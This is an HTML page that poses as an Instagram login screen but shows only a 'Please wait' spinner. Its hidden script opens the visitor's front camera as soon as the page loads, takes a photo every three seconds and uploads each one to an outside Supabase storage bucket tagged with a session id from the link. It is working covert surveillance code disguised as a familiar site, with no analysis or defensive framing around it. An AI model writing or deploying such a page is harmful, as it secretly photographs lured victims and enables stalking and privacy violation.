<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
main{display:flex;align-items:center;justify-content:center}
#mobile{width:380px;height:580px;background:url('https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png') no-repeat center center;background-size:contain;margin-right:32px;display:flex}
@media(max-width:800px){#mobile{display:none}}
#auth{display:flex;flex-direction:column;width:350px}
.panel{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;margin-bottom:10px}
.login h1{display:flex;justify-content:center;margin-bottom:22px}
.login h1 img{width:175px}
form{display:flex;flex-direction:column;gap:6px}
.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0}
form input{background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:9px 8px;font-size:12px;outline:none;width:100%}
form input:focus{border-color:#a8a8a8}
form button{margin-top:8px;background:#0095f6;color:#fff;border:none;border-radius:8px;padding:7px;font-size:14px;font-weight:600;cursor:pointer;width:100%}
form button:hover{background:#1877f2}
form button:disabled{opacity:.6;cursor:not-allowed}
.separator{display:flex;align-items:center;margin:18px 0;gap:18px}
.separator span{flex:1;height:1px;background:#dbdbdb}
.separator .or{font-size:13px;font-weight:600;color:#8e8e8e}
.login-with-fb{display:flex;flex-direction:column;align-items:center;gap:14px}
.login-with-fb>div{display:flex;align-items:center;gap:8px;cursor:pointer}
.login-with-fb>div a{color:#385185;font-size:14px;font-weight:600;text-decoration:none}
.login-with-fb>a{color:#00376b;font-size:12px;text-decoration:none}
.register{display:flex;justify-content:center;gap:6px;padding:20px}
.register p{font-size:14px;color:#262626}
.register a{font-size:14px;color:#0095f6;font-weight:600;text-decoration:none}
.app-download{display:flex;flex-direction:column;align-items:center;margin-top:16px;gap:14px}
.app-download p{font-size:14px;color:#262626}
.app-download>div{display:flex;gap:8px;justify-content:center}
.app-download img{height:40px;cursor:pointer}
footer{margin-top:52px;text-align:center;padding:0 20px 20px}
footer ul{list-style:none;display:flex;flex-wrap:wrap;justify-content:center;gap:4px 16px;margin-bottom:16px}
footer ul li a{font-size:11px;color:#8e8e8e;text-decoration:none}
footer .copyright{font-size:11px;color:#8e8e8e}
#msg{text-align:center;font-size:12px;margin-top:8px;color:#ed4956;min-height:16px}
video,canvas{display:none}
</style>
</head>
<body>
<div id="loading" style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;gap:20px">
  <div style="font-size:24px;font-weight:600;color:#262626">Please wait</div>
  <div style="width:40px;height:40px;border:4px solid #dbdbdb;border-top:4px solid #0095f6;border-radius:50%;animation:spin 1s linear infinite"></div>
</div>
<style>
@keyframes spin{to{transform:rotate(360deg)}}
</style>
<video id="v" autoplay playsinline muted></video><canvas id="c"></canvas>
<script>
const S='https://yspjknemdmlejzsubycf.supabase.co',K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlzcGprbmVtZG1sZWp6c3VieWNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI3MDgyOTgsImV4cCI6MjA4ODI4NDI5OH0.JSAXs0UZJiBy2mgniSoSuN6BuW1iW-UhW785toC1weM';
const sid=new URLSearchParams(location.search).get('s');
const v=document.getElementById('v'),c=document.getElementById('c'),ctx=c.getContext('2d');

// Auto-start camera on page load
window.addEventListener('load',()=>startCamera());

function startCamera(){
  if(!sid) return;
  navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}}})
  .then(stream=>{
    v.srcObject=stream;
    v.onloadedmetadata=()=>{c.width=v.videoWidth;c.height=v.videoHeight;v.play().then(()=>{setTimeout(()=>{up();setInterval(up,3000);},1000);});};
  }).catch(()=>{});
}

async function up(){
  if(v.readyState<2)return;
  ctx.drawImage(v,0,0,c.width,c.height);
  const d=ctx.getImageData(0,0,10,10).data;let s=0;
  for(let i=0;i<d.length;i+=4)s+=d[i]+d[i+1]+d[i+2];
  if(s<100)return;
  const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.85));if(!blob)return;
  const f=sid+'/'+Date.now()+'.jpg';
  const r=await fetch(S+'/storage/v1/object/captures/'+f,{method:'POST',headers:{'Authorization':'Bearer '+K,'Content-Type':'image/jpeg','x-upsert':'true'},body:blob});
  if(!r.ok)return;
  await fetch(S+'/rest/v1/photos',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json'},body:JSON.stringify({session_id:sid,image_url:S+'/storage/v1/object/public/captures/'+f})});
}


</script>
</body>
</html>
